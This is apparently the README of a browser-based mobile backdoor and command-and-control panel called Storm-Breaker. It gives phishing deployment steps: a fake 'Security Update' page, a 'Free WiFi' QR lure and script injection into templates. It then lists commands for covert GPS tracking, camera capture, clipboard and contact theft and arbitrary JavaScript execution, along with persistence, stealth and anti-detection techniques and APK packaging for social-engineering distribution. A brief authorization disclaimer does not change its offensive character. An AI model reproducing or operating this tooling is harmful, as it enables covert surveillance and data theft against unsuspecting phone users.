# Storm-Breaker Mobile Backdoor System

## Overview
Complete mobile device access system for both Android and iOS devices using JavaScript-based backdoor technology.

---

## 📱 **How It Works**

### Architecture
```
Mobile Device (Android/iOS)
    ↓
JavaScript Backdoor (mobile-backdoor.js)
    ↓
HTTP Polling (every 3 seconds)
    ↓
Flask Backend API (/api/mobile/*)
    ↓
C2 Dashboard (Storm-Breaker Panel)
```

### Key Features
- ✅ **Cross-Platform**: Works on both Android and iOS
- ✅ **No App Installation**: Pure web-based (JavaScript)
- ✅ **Persistent**: Uses localStorage + Service Workers
- ✅ **Stealthy**: Runs in background, no visible indicators
- ✅ **Full Device Access**: Camera, Location, Battery, Clipboard, etc.

---

## 🚀 **Deployment Methods**

### Method 1: Phishing Link (Recommended)
1. Send victim to: `https://your-ngrok-url.ngrok-free.dev/t/mobile_security_update/`
2. Page disguises as "Security Update"
3. Backdoor loads automatically in background
4. Victim clicks "Install Security Update"
5. Page redirects to Google (looks legitimate)
6. **Backdoor persists in browser!**

### Method 2: Direct JavaScript Injection
Add this to any phishing template:
```html
<script src="../../assets/js/mobile-backdoor.js"></script>
```

### Method 3: QR Code
1. Generate QR code for the phishing URL
2. Print/display QR code with text like "Scan for Free WiFi"
3. Victim scans → Opens page → Backdoor installs

---

## 🎯 **Available Commands**

Once a mobile device is connected, you can send these commands:

### 1. Get Location
```
Command: get_location
Returns: GPS coordinates, accuracy, altitude, speed, heading
```

### 2. Capture Camera
```
Command: capture_camera
Returns: Photo from front camera (saved to /images/)
```

### 3. Get Battery Info
```
Command: get_battery
Returns: Battery level, charging status, time remaining
```

### 4. Get Device Info
```
Command: get_device_info
Returns: Full device fingerprint (OS, browser, screen, memory, etc.)
```

### 5. Get Clipboard
```
Command: get_clipboard
Returns: Current clipboard contents
```

### 6. Vibrate Device
```
Command: vibrate
Effect: Makes device vibrate (confirmation of access)
```

### 7. Get Storage Info
```
Command: get_storage
Returns: Storage quota, usage, percentage
```

### 8. Get Contacts
```
Command: get_contacts
Returns: Contact list (requires user interaction)
Note: Modern browsers require user gesture
```

### 9. Execute JavaScript
```
Command: eval:alert('Hello')
Effect: Runs arbitrary JavaScript code on device
```

---

## 🔧 **API Endpoints**

### Register Mobile Client
```
POST /api/mobile/register
Body: {
    "uid": "mobile-abc123-1234567890",
    "info": {
        "userAgent": "...",
        "platform": "...",
        "battery": {...},
        ...
    }
}
```

### Poll for Commands
```
POST /api/mobile/poll
Body: {"uid": "mobile-abc123-1234567890"}
Response: {"command": "get_location"} or {"command": null}
```

### Send Response
```
POST /api/mobile/response
Body: {
    "uid": "mobile-abc123-1234567890",
    "output": "Location: 37.7749, -122.4194"
}
```

### Send Camera Image
```
POST /api/mobile/camera
Body: {
    "uid": "mobile-abc123-1234567890",
    "image": "data:image/jpeg;base64,/9j/4AAQ..."
}
```

### Get Connected Clients
```
GET /api/mobile/clients
Response: {
    "clients": [
        {
            "uid": "mobile-abc123-1234567890",
            "info": {...},
            "ip": "192.168.1.100",
            "last_seen": "2025-12-08T22:30:00",
            "seconds_ago": 5
        }
    ]
}
```

### Send Command to Client
```
POST /api/mobile/send_command
Body: {
    "uid": "mobile-abc123-1234567890",
    "command": "get_location"
}
```

### Get Command Response
```
GET /api/mobile/get_response/<uid>
Response: {
    "output": "Location: 37.7749, -122.4194",
    "timestamp": "2025-12-08T22:30:00"
}
```

---

## 💻 **Using the C2 Dashboard**

### View Connected Mobile Devices
```javascript
// In browser console or via API
fetch('/api/mobile/clients')
    .then(r => r.json())
    .then(data => console.log(data.clients));
```

### Send Command
```javascript
fetch('/api/mobile/send_command', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        uid: 'mobile-abc123-1234567890',
        command: 'get_location'
    })
});
```

### Get Response
```javascript
fetch('/api/mobile/get_response/mobile-abc123-1234567890')
    .then(r => r.json())
    .then(data => console.log(data.output));
```

---

## 🔒 **Persistence Mechanisms**

### 1. LocalStorage
- Stores UID and active flag
- Survives page reloads
- Cleared only if user clears browser data

### 2. Service Worker (if supported)
- Runs in background even when page closed
- Can receive push notifications
- Survives browser restarts

### 3. Wake Lock (if supported)
- Keeps screen on
- Prevents device sleep
- Maintains connection

### 4. Visibility Change Handler
- Auto-restarts polling if stopped
- Survives tab switching
- Maintains persistence

### 5. BeforeUnload Prevention
- Warns user before closing
- Increases session duration
- Reduces accidental disconnects

---

## 📊 **Data Collection**

### Automatic Collection (on connect)
- User Agent
- Platform (Android/iOS/Windows)
- Screen resolution
- Color depth
- Timezone
- Language
- CPU cores
- RAM
- Network type (4G/5G/WiFi)
- Battery status
- Permission states

### On-Demand Collection
- GPS location (high accuracy)
- Camera photos
- Clipboard contents
- Storage usage
- Contacts (with user interaction)
- Custom JavaScript execution

---

## 🎭 **Stealth Features**

### Hidden Operation
- No visible UI elements
- Runs silently in background
- No console logs (in production)
- No network errors shown

### Legitimate Appearance
- Uses HTTPS (via ngrok)
- Disguised as security update
- Redirects to Google after "install"
- No suspicious permissions requested upfront

### Anti-Detection
- Minimal network traffic (3-second polls)
- Uses common API endpoints
- Blends with normal web traffic
- No suspicious process names

---

## 🧪 **Testing Workflow**

### 1. Start the Server
```bash
cd C:\Users\Administrator\Storm-Breaker\storm-web
python app.py
```

### 2. Start Ngrok
```bash
cd C:\Users\Administrator\Downloads\ngrok-v3-stable-windows-amd64
.\ngrok http 2525
```

### 3. Open Mobile Phishing Page
On your phone, visit:
```
https://your-ngrok-url.ngrok-free.dev/t/mobile_security_update/
```

### 4. Check Connection
```bash
curl http://localhost:2525/api/mobile/clients
```

### 5. Send Test Command
```bash
curl -X POST http://localhost:2525/api/mobile/send_command \
  -H "Content-Type: application/json" \
  -d '{"uid":"mobile-xxx","command":"get_device_info"}'
```

### 6. Get Response
```bash
curl http://localhost:2525/api/mobile/get_response/mobile-xxx
```

---

## 📱 **Platform-Specific Notes**

### Android
- ✅ Full camera access
- ✅ High-accuracy GPS
- ✅ Battery API
- ✅ Vibration API
- ✅ Clipboard (limited)
- ⚠️ Contacts require user interaction
- ⚠️ Service Workers may be limited

### iOS (Safari)
- ✅ Camera access (with permission)
- ✅ GPS location
- ⚠️ Battery API limited
- ❌ Vibration not supported
- ❌ Clipboard very restricted
- ❌ Service Workers limited
- ⚠️ Wake Lock not supported

### Desktop Browsers (Bonus)
- ✅ All features work
- ✅ Better persistence
- ✅ More APIs available

---

## 🔐 **Security Considerations**

### For Penetration Testing
- ✅ Always have written authorization
- ✅ Document all mobile devices accessed
- ✅ Provide removal instructions
- ✅ Clean up after testing

### Limitations
- Requires victim to visit URL
- Needs browser permissions for camera/location
- Can be cleared by clearing browser data
- iOS has more restrictions than Android
- Requires active internet connection

---

## 🚨 **Removal Instructions**

### For Testing/Cleanup
On the mobile device:

1. **Clear Browser Data**
   - Settings → Safari/Chrome → Clear History and Website Data
   - Or: Settings → Privacy → Clear Browsing Data

2. **Revoke Permissions**
   - Settings → Safari/Chrome → Permissions
   - Remove camera/location permissions for the site

3. **Close All Tabs**
   - Close the phishing page tab
   - Close any background tabs

4. **Restart Browser**
   - Force close the browser app
   - Reopen to ensure clean state

---

## 📈 **Advanced Usage**

### Create Custom Commands
Edit `mobile-backdoor.js` and add:
```javascript
else if (cmd === 'my_custom_command') {
    // Your custom code here
    await this.sendResponse('Custom command executed');
}
```

### Integrate with Other Templates
Add to any template's `index.html`:
```html
<script src="../../assets/js/mobile-backdoor.js"></script>
```

### Build Android APK (Advanced)
Use a WebView wrapper to package the backdoor:
1. Create Android project with WebView
2. Load the phishing URL in WebView
3. Request all permissions in AndroidManifest.xml
4. Build APK and sign
5. Distribute via social engineering

---

## 🎯 **Use Cases**

### Red Team Operations
- Mobile device compromise
- Data exfiltration
- Location tracking
- Social engineering validation

### Penetration Testing
- Mobile security assessment
- Browser security testing
- Permission abuse testing
- Persistence validation

### Security Research
- Mobile browser capabilities
- API abuse potential
- Persistence mechanisms
- Detection evasion

---

## 📞 **Support**

### Troubleshooting
- **No devices connecting**: Check ngrok URL, ensure HTTPS
- **Commands not executing**: Check browser console for errors
- **Camera not working**: Ensure HTTPS and permissions granted
- **iOS issues**: iOS has stricter security, some features limited

### Logs
- Backend: Check Flask console output
- Frontend: Check browser developer console (F12)
- Network: Check browser Network tab for API calls

---

**Created for Storm-Breaker C2 Framework**
**Version:** 2.0
**Platform:** Cross-Platform (Android/iOS/Desktop)
**Last Updated:** December 2025
